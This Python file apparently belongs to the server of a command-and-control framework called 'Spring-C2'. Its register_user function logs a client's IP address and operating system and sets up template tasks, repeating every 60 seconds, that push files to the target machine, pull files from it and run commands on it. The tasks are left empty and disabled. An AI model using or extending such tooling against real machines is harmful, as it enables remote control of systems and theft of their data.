from server import db
from server.models import User, Task
from datetime import datetime, timedelta
from server.task_modes import TaskMode
import os
from server.config import Config

def register_user(username, client_id, ip_addr, op_system):
    # Dummy Task
    dummy_command = r"" # Link to file to download to target machine
    dummy_task = Task(
        client_id=client_id,
        command=dummy_command,
        command_mode=TaskMode.FILE_DOWNLOAD.value,
        repeat_interval=60,
        run_once=False,
        next_execution=datetime.utcnow() + timedelta(seconds=30),
        target_path = r"" # Location to write the file on the target machine
    )
    # db.session.add(dummy_task)
    
    dummy_command = r"" # Path of file on target machine to upload to server
    dummy_task_2 = Task(
        client_id=client_id,
        command=dummy_command,
        command_mode=TaskMode.FILE_UPLOAD.value,
        repeat_interval=60,
        run_once=False,
        next_execution=datetime.utcnow() + timedelta(seconds=30),
        target_path = None
    )
    # db.session.add(dummy_task_2)
    
    dummy_command_3 = "echo Hello from Spring-C2!"
    dummy_task_3 = Task(
        client_id=client_id,
        command=dummy_command_3,
        command_mode=TaskMode.COMMAND.value,
        repeat_interval=60,
        run_once=False,
        next_execution=datetime.utcnow() + timedelta(seconds=30)
    )
    # db.session.add(dummy_task_3)
    
    if not User.query.filter_by(client_id=client_id).first(): 
        new_user = User(username=username, client_id=client_id)
        new_user.ip_address = ip_addr
        new_user.op_system = op_system
        
        db.session.add(new_user)
        os.mkdir(os.path.join(
            Config.get("upload", "base_upload_path"),
            client_id
        ))
        # db.session.commit()
        
    db.session.commit()

    
    return {"status": "SUCCESS", "client_id": client_id}